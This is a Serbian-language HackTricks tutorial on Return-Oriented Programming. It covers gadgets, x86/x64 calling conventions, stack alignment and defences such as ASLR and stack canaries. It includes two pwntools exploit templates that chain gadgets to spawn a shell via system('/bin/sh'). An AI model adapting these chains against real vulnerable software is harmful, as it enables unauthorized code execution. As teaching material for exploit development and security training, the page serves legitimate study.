# ROP - Return Oriented Programing

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## **Osnovne informacije**

**Return-Oriented Programming (ROP)** je napredna tehnika eksploatacije koja se koristi za zaobilaženje sigurnosnih mera poput **No-Execute (NX)** ili **Data Execution Prevention (DEP)**. Umesto ubacivanja i izvršavanja shell koda, napadač koristi delove koda već prisutne u binarnom fajlu ili u učitanim bibliotekama, poznate kao **"gadgeti"**. Svaki gadget obično završava sa `ret` instrukcijom i obavlja malu operaciju, poput premeštanja podataka između registara ili izvođenja aritmetičkih operacija. Spajanjem ovih gadgeta, napadač može konstruisati payload za obavljanje proizvoljnih operacija, efikasno zaobilazeći NX/DEP zaštite.

### Kako ROP funkcioniše

1. **Preuzimanje kontrole toka**: Prvo, napadač mora preuzeti kontrolu toka programa, obično iskorišćavanjem prelivanja bafera da bi prepisao sačuvanu adresu povratka na steku.
2. **Spajanje Gadgeta**: Napadač zatim pažljivo bira i spaja gadgete da bi izvršio željene akcije. To može uključivati postavljanje argumenata za poziv funkcije, pozivanje funkcije (npr. `system("/bin/sh")`), i rukovanje neophodnim čišćenjem ili dodatnim operacijama.
3. **Izvršavanje Payloada**: Kada ranjiva funkcija završi, umesto povratka na legitimnu lokaciju, počinje izvršavanje lanca gadgeta.

### Alati

Gadgeti se obično mogu pronaći korišćenjem [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) ili direktno iz **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## ROP Lanac u x86 Primeru

### **x86 (32-bit) Konvencije pozivanja**

* **cdecl**: Pozivaoc čisti stek. Argumenti funkcije se guraju na stek u obrnutom redosledu (sa desna na levo). **Argumenti se guraju na stek s desna na levo.**
* **stdcall**: Slično cdecl-u, ali je callee odgovoran za čišćenje steka.

### **Pronalaženje Gadgeta**

Prvo, pretpostavimo da smo identifikovali potrebne gadgete unutar binarnog fajla ili njegovih učitanih biblioteka. Gadgeti koji nas zanimaju su:

* `pop eax; ret`: Ovaj gadget skida vrh vrednosti sa steka u registar `EAX` i zatim se vraća, omogućavajući nam kontrolu nad `EAX`.
* `pop ebx; ret`: Slično kao prethodno, ali za registar `EBX`, omogućavajući kontrolu nad `EBX`.
* `mov [ebx], eax; ret`: Premešta vrednost iz `EAX` u memorijsku lokaciju na koju pokazuje `EBX` i zatim se vraća. Ovo se često naziva **write-what-where gadget**.
* Dodatno, imamo adresu funkcije `system()` dostupnu.

### **ROP Lanac**

Koristeći **pwntools**, pripremamo stek za izvršavanje ROP lanca kako bismo izvršili `system('/bin/sh')`, obratite pažnju kako lanac počinje sa:

1. `ret` instrukcijom radi poravnanja (opciono)
2. Adresa funkcije `system` (pretpostavljajući da je ASLR isključen i poznata libc, više informacija u [**Ret2lib**](ret2lib/))
3. Rezervisano mesto za adresu povratka iz `system()`
4. Adresa stringa `"/bin/sh"` (parametar za funkciju system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Primer ROP lanac u x64

### **x64 (64-bit) Konvencije pozivanja**

* Koristi **System V AMD64 ABI** konvenciju pozivanja na sistemima sličnim Unix-u, gde se **prva šest celobrojnih ili pokazivačkih argumenata prosleđuje u registre `RDI`, `RSI`, `RDX`, `RCX`, `R8`, i `R9`**. Dodatni argumenti se prosleđuju na steku. Povratna vrednost se smešta u `RAX`.
* **Windows x64** konvencija pozivanja koristi `RCX`, `RDX`, `R8`, i `R9` za prva četiri celobrojna ili pokazivačka argumenta, sa dodatnim argumentima prosleđenim na steku. Povratna vrednost se smešta u `RAX`.
* **Registri**: 64-bitni registri uključuju `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, i `R8` do `R15`.

#### **Pronalaženje Gadgeta**

Za našu svrhu, fokusiraćemo se na gedžete koji će nam omogućiti postavljanje registra **RDI** (kako bismo prosledili string **"/bin/sh"** kao argument funkciji **system()**) i zatim pozvali funkciju **system()**. Pretpostavićemo da smo identifikovali sledeće gedžete:

* **pop rdi; ret**: Skida vrh vrednosti sa steka u registar **RDI** i zatim se vraća. Neophodno za postavljanje argumenta za **system()**.
* **ret**: Jednostavan povratak, koristan za poravnanje steka u nekim scenarijima.

I znamo adresu funkcije **system()**.

### **ROP Lanac**

U nastavku je primer korišćenja **pwntools** za postavljanje i izvršavanje ROP lanca sa ciljem izvršavanja **system('/bin/sh')** na **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
U ovom primeru:

* Koristimo **`pop rdi; ret`** gedžet da postavimo **`RDI`** na adresu **`"/bin/sh"`**.
* Direktno skačemo na **`system()`** nakon postavljanja **`RDI`**, sa adresom **system()** funkcije u lancu.
* **`ret_gadget`** se koristi za poravnanje ako ciljano okruženje zahteva, što je češće u **x64** da bi se osiguralo pravilno poravnanje steka pre pozivanja funkcija.

### Poravnanje Staka

**x86-64 ABI** osigurava da je **stek poravnan na 16 bajtova** kada se izvrši **call instrukcija**. **LIBC**, radi optimizacije performansi, **koristi SSE instrukcije** (kao što su **movaps**) koje zahtevaju ovo poravnanje. Ako stek nije pravilno poravnan (što znači da **RSP** nije višekratnik broja 16), pozivi funkcija poput **system** će neuspeti u **ROP lancu**. Da biste to rešili, jednostavno dodajte **ret gedžet** pre pozivanja **system** u vašem ROP lancu.

## x86 vs x64 glavna razlika

{% hint style="success" %}
Pošto **x64 koristi registre za prvih nekoliko argumenata**, često zahteva manje gedžeta od x86 za jednostavne pozive funkcija, ali pronalaženje i povezivanje pravih gedžeta može biti složenije zbog povećanog broja registara i većeg adresnog prostora. Povećani broj registara i veći adresni prostor u **x64** arhitekturi pružaju i mogućnosti i izazove za razvoj eksploatacija, posebno u kontekstu Return-Oriented Programming (ROP).
{% endhint %}

## ROP lanac u ARM64 Primeru

### **ARM64 Osnove & Konvencije pozivanja**

Proverite sledeću stranicu za ove informacije:

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}



## Zaštite Protiv ROP

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **&** [**PIE**](../common-binary-protections-and-bypasses/pie/): Ove zaštite otežavaju korišćenje ROP jer se adrese gedžeta menjaju između izvršavanja.
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/): U slučaju BOF-a, potrebno je zaobići čuvare steka kako bi se prepisali povratni pokazivači i iskoristio ROP lanac.
* **Nedostatak Gedžeta**: Ako nema dovoljno gedžeta, neće biti moguće generisati ROP lanac.

## Tehnike Bazirane na ROP-u

Primetite da je ROP samo tehnika za izvršavanje proizvoljnog koda. Bazirano na ROP-u, razvijeno je mnogo Ret2XXX tehnika:

* **Ret2lib**: Koristi ROP za pozivanje proizvoljnih funkcija iz učitane biblioteke sa proizvoljnim parametrima (obično nešto poput `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Koristi ROP za pripremu poziva syscall-a, npr. `execve`, i izvršava proizvoljne komande.

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: Prvi će zloupotrebiti EBP umesto EIP-a za kontrolu toka, a drugi je sličan Ret2lib-u, ali u ovom slučaju tok je kontrolisan uglavnom sa EBP adresama (mada je takođe potrebno kontrolisati i EIP).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## Ostali Primeri & Reference

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 bita, Pie i nx omogućeno, bez čuvara, prepisivanje RIP-a sa adresom `vsyscall` sa jedinim ciljem povratka na sledeću adresu na steku koja će biti delimično prepisivanje adrese kako bi se dobio deo funkcije koji otkriva zastavu
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, bez ASLR-a, ROP gedžet za omogućavanje izvršavanja steka i skakanje na shellcode u steku

{% hint style="success" %}
Naučite & vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite & vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
